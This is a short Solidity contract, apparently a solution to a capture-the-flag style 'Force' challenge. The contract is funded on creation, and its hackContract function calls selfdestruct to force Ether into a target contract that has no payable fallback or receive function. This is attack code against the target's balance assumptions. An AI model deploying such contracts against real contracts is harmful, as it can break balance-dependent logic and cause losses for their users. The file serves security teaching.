// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        //Selfdestruc cannot be reverted even without fallback/receive functions declared in contractAddress.
        selfdestruct(payable(contractAddress));
    }

}
